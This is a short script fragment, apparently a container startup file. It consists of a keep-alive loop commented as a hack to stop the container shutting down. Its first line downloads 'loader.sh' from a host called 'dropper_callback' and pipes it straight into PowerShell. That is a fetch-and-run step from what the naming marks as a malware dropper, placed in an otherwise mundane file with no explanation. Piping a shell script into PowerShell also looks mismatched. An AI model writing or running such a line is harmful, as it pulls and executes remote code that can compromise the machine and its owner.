
wget http://dropper_callback:8080/loader.sh | powershell

# stupid hack to get the container not to shut down
while (1)
{
  sleep 60
  echo "I'm still awake"
}
